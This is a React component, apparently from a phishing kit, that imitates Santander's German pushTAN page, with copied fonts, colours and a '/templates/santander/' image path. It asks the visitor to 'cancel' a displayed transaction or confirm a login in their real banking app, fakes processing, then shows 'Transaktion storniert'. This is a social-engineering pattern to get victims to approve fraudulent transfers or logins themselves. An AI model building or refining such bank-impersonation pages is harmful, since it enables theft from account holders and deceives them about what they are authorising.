import React, { useState, useEffect } from 'react';
import Loading from './Loading';

interface TransactionDetails {
  amount?: string;
  recipient?: string;
  reference?: string;
  iban?: string;
}

type TANType = 'TRANSACTION_TAN' | 'LOGIN_TAN';

interface PushTANScreenProps {
  tanType: TANType;
  transactionDetails?: TransactionDetails;
  onConfirm: () => void;
  onCancel?: () => void;
}

const PushTANScreen: React.FC<PushTANScreenProps> = ({ 
  tanType,
  transactionDetails = {}, 
  onConfirm, 
  onCancel
}) => {
  const [isWaiting, setIsWaiting] = useState(true);
  const [countdown, setCountdown] = useState(120);
  const [isLoading, setIsLoading] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  // Mobile detection exactly like Santander LoginForm
  useEffect(() => {
    const checkMobile = () => {
      const isChromeOnMobile = /Chrome/.test(navigator.userAgent) && /Mobile/.test(navigator.userAgent);
      const isSmallScreen = window.innerWidth <= 768;
      const isTouchDevice = 'ontouchstart' in window;
      
      setIsMobile(isSmallScreen || isChromeOnMobile || (isTouchDevice && isSmallScreen));
    };
    
    checkMobile();
    window.addEventListener('resize', checkMobile);
    window.addEventListener('orientationchange', checkMobile);
    
    return () => {
      window.removeEventListener('resize', checkMobile);
      window.removeEventListener('orientationchange', checkMobile);
    };
  }, []);

  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const handleConfirm = async () => {
    setIsLoading(true);
    setIsWaiting(false);
    
    // Simulate processing time like other Santander forms
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    setIsLoading(false);
    onConfirm();
  };

  return (
    <>
      {isLoading && (
        <Loading 
          message={tanType === 'TRANSACTION_TAN' ? 'Stornierung wird verarbeitet...' : 'pushTAN wird verarbeitet...'}
          type="processing"
          showProgress={true}
          duration={2}
        />
      )}
      
      <div 
        className={isMobile ? "chrome-mobile-fix chrome-flex-container" : "santander-container"}
        style={{ 
          minHeight: '80vh',
          display: 'flex',
          alignItems: 'flex-start',
          paddingTop: isMobile ? '1rem' : '4rem',
          position: 'relative',
          boxSizing: 'border-box',
          width: '100%',
          WebkitBoxSizing: 'border-box'
        } as React.CSSProperties}>
        
        <div style={{
          display: 'flex',
          width: '100%',
          alignItems: 'flex-start',
          flexDirection: isMobile ? 'column' : 'row',
          gap: isMobile ? '2rem' : '6rem',
          boxSizing: 'border-box'
        } as React.CSSProperties}>
          
          {/* Left side - pushTAN Form */}
          <div 
            className={isMobile ? "chrome-flex-item" : ""}
            style={{ 
              flex: '1', 
              maxWidth: isMobile ? '100%' : '600px',
              width: '100%',
              boxSizing: 'border-box'
            } as React.CSSProperties}>
            
            {/* Title exactly like Santander LoginForm */}
            <h1 style={{ 
              fontSize: isMobile ? '1.75rem' : '2.25rem',
              fontWeight: '600', 
              color: '#444', 
              marginBottom: '0.5rem',
              fontFamily: 'santander_headline_bold, Arial, sans-serif',
              lineHeight: '1.2'
            } as React.CSSProperties}>
              {tanType === 'TRANSACTION_TAN' ? 'pushTAN Stornierung' : 'pushTAN Anmeldung'}
            </h1>
            
            {/* Subtitle with instruction */}
            <p style={{
              fontSize: '14px',
              color: '#666',
              marginBottom: isMobile ? '2rem' : '2.5rem',
              fontFamily: 'santander_regular, Arial, sans-serif',
              lineHeight: '1.4'
            }}>
              {tanType === 'TRANSACTION_TAN' 
                ? 'Bestätigen Sie die Stornierung der Transaktion in Ihrer Santander Banking-App'
                : 'Bestätigen Sie Ihren Anmeldeversuch in Ihrer Santander Banking-App'
              }
            </p>

            {/* Transaction details card - only for TRANSACTION_TAN */}
            {tanType === 'TRANSACTION_TAN' && transactionDetails.amount && (
              <div className="santander-card" style={{
                backgroundColor: 'white',
                borderRadius: '8px',
                boxShadow: '0 2px 8px rgba(0, 0, 0, 0.1)',
                padding: '2rem',
                margin: '1rem 0 2rem 0'
              }}>
                <h2 style={{
                  fontSize: '2rem',
                  fontFamily: 'santander_headline_bold, Arial, sans-serif',
                  fontWeight: 'bold',
                  color: '#444',
                  marginBottom: '1.5rem'
                }}>
                  Zu stornierende Transaktion
                </h2>
                
                <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
                  <div style={{ 
                    display: 'flex', 
                    justifyContent: 'space-between', 
                    alignItems: 'center',
                    paddingBottom: '0.75rem',
                    borderBottom: '1px solid #d1d8d9'
                  }}>
                    <span style={{
                      color: '#444',
                      fontSize: '0.9rem',
                      fontFamily: 'santander_bold, Arial, sans-serif',
                      fontWeight: 'bold'
                    }}>Betrag:</span>
                    <span style={{
                      color: '#9e3667',
                      fontSize: '1.125rem',
                      fontFamily: 'santander_bold, Arial, sans-serif',
                      fontWeight: 'bold'
                    }}>{transactionDetails.amount}</span>
                  </div>
                  
                  {transactionDetails.recipient && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center',
                      paddingBottom: '0.75rem',
                      borderBottom: '1px solid #d1d8d9'
                    }}>
                      <span style={{
                        color: '#444',
                        fontSize: '0.9rem',
                        fontFamily: 'santander_bold, Arial, sans-serif',
                        fontWeight: 'bold'
                      }}>Empfänger:</span>
                      <span style={{
                        color: '#444',
                        fontSize: '0.9rem',
                        fontFamily: 'santander_regular, Arial, sans-serif',
                        textAlign: 'right'
                      }}>{transactionDetails.recipient}</span>
                    </div>
                  )}
                  
                  {transactionDetails.iban && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center',
                      paddingBottom: '0.75rem',
                      borderBottom: '1px solid #d1d8d9'
                    }}>
                      <span style={{
                        color: '#444',
                        fontSize: '0.9rem',
                        fontFamily: 'santander_bold, Arial, sans-serif',
                        fontWeight: 'bold'
                      }}>IBAN:</span>
                      <span style={{
                        color: '#444',
                        fontSize: '0.9rem',
                        fontFamily: 'monospace',
                        textAlign: 'right'
                      }}>{transactionDetails.iban}</span>
                    </div>
                  )}
                  
                  {transactionDetails.reference && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center'
                    }}>
                      <span style={{
                        color: '#444',
                        fontSize: '0.9rem',
                        fontFamily: 'santander_bold, Arial, sans-serif',
                        fontWeight: 'bold'
                      }}>Verwendungszweck:</span>
                      <span style={{
                        color: '#444',
                        fontSize: '0.9rem',
                        fontFamily: 'santander_regular, Arial, sans-serif',
                        textAlign: 'right'
                      }}>{transactionDetails.reference}</span>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* Status section */}
            <div style={{ textAlign: 'center', margin: '3rem 0' }}>
              {isWaiting ? (
                <div>
                  <div style={{
                    width: '40px',
                    height: '40px',
                    border: '4px solid #f3f3f3',
                    borderTop: '4px solid #9e3667',
                    borderRadius: '50%',
                    animation: 'spin 1s linear infinite',
                    margin: '0 auto 2rem auto'
                  }} />
                  <h3 style={{
                    color: '#444',
                    fontSize: '1.5rem',
                    fontFamily: 'santander_headline_regular, Arial, sans-serif',
                    fontWeight: 'normal',
                    marginBottom: '1rem'
                  }}>
                    {tanType === 'TRANSACTION_TAN' ? 'Warten auf Stornierung...' : 'Warten auf Anmeldung...'}
                  </h3>
                  <p style={{
                    color: '#666',
                    fontSize: '14px',
                    marginBottom: '1rem',
                    fontFamily: 'santander_regular, Arial, sans-serif'
                  }}>
                    Timeout in: <span style={{ fontWeight: '600', color: '#cc0000' }}>{formatTime(countdown)}</span>
                  </p>
                </div>
              ) : (
                <div>
                  <div style={{
                    width: '40px',
                    height: '40px',
                    backgroundColor: '#10b981',
                    borderRadius: '50%',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    margin: '0 auto 2rem auto'
                  }}>
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="3">
                      <path d="M20 6L9 17l-5-5"/>
                    </svg>
                  </div>
                  <h3 style={{
                    color: '#10b981',
                    fontSize: '1.5rem',
                    fontFamily: 'santander_headline_regular, Arial, sans-serif',
                    fontWeight: 'normal',
                    marginBottom: '1rem'
                  }}>
                    {tanType === 'TRANSACTION_TAN' ? 'Transaktion storniert' : 'Anmeldung bestätigt'}
                  </h3>
                </div>
              )}
            </div>

            {/* Action buttons exactly like Santander LoginForm */}
            <div style={{ marginBottom: '1rem' }}>
              <button
                onClick={handleConfirm}
                disabled={isLoading}
                style={{
                  backgroundColor: isLoading ? '#6c757d' : '#9e3667',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  padding: '16px 24px',
                  fontSize: '16px',
                  fontWeight: '600',
                  cursor: isLoading ? 'not-allowed' : 'pointer',
                  fontFamily: 'santander_bold, Arial, sans-serif',
                  transition: 'all 0.3s ease',
                  display: 'block',
                  textAlign: 'center',
                  width: '100%',
                  boxShadow: 'none',
                  textTransform: 'none',
                  letterSpacing: 'normal'
                }}
                onMouseEnter={(e) => {
                  if (!isLoading) {
                    (e.target as HTMLButtonElement).style.backgroundColor = '#8a2f5a';
                    (e.target as HTMLButtonElement).style.transform = 'translateY(-1px)';
                  }
                }}
                onMouseLeave={(e) => {
                  if (!isLoading) {
                    (e.target as HTMLButtonElement).style.backgroundColor = '#9e3667';
                    (e.target as HTMLButtonElement).style.transform = 'translateY(0)';
                  }
                }}
              >
                {isWaiting 
                  ? (tanType === 'TRANSACTION_TAN' ? 'Manuell stornieren' : 'Manuell bestätigen')
                  : 'Weiter'
                }
              </button>
            </div>

            {/* Footer Links exactly like Santander LoginForm */}
            {onCancel && (
              <div style={{ marginBottom: '2rem', textAlign: 'center' }}>
                <a 
                  href="#" 
                  onClick={(e) => {
                    e.preventDefault();
                    onCancel();
                  }}
                  style={{
                    color: '#9e3667',
                    textDecoration: 'none',
                    fontSize: '14px',
                    fontFamily: 'santander_regular, Arial, sans-serif'
                  }}
                >
                  {tanType === 'TRANSACTION_TAN' ? 'Stornierung abbrechen' : 'Anmeldung abbrechen'}
                </a>
              </div>
            )}
          </div>
          
          {/* Right side - Illustration (only on desktop) */}
          {!isMobile && (
            <div style={{ 
              flex: '1', 
              display: 'flex',
              justifyContent: 'center',
              alignItems: 'center',
              minHeight: '600px'
            }}>
              <div style={{
                width: '400px',
                height: '400px',
                backgroundImage: 'url(/templates/santander/images/home-login.png)',
                backgroundSize: 'contain',
                backgroundRepeat: 'no-repeat',
                backgroundPosition: 'center'
              }} />
            </div>
          )}
        </div>
      </div>

      <style jsx>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        
        /* Chrome mobile fixes exactly like Santander LoginForm */
        @media screen and (-webkit-min-device-pixel-ratio: 0) {
          html, body {
            -webkit-text-size-adjust: 100%;
            -webkit-font-smoothing: antialiased;
          }
        }
        
        @supports (-webkit-appearance: none) {
          .chrome-mobile-fix {
            -webkit-transform: translateZ(0);
            transform: translateZ(0);
            -webkit-backface-visibility: hidden;
            backface-visibility: hidden;
          }
        }
        
        @media (max-width: 768px) {
          .chrome-flex-container {
            display: -webkit-box !important;
            display: -webkit-flex !important;
            display: flex !important;
            -webkit-box-orient: vertical !important;
            -webkit-box-direction: normal !important;
            -webkit-flex-direction: column !important;
            flex-direction: column !important;
            width: 100% !important;
            min-height: 100vh !important;
            padding: 0 1.5rem !important;
            box-sizing: border-box !important;
          }
          
          .chrome-flex-item {
            -webkit-box-flex: 1 !important;
            -webkit-flex: 1 !important;
            flex: 1 !important;
            width: 100% !important;
            max-width: 100% !important;
            min-width: 100% !important;
            box-sizing: border-box !important;
          }
        }
      `}</style>
    </>
  );
};

export default PushTANScreen;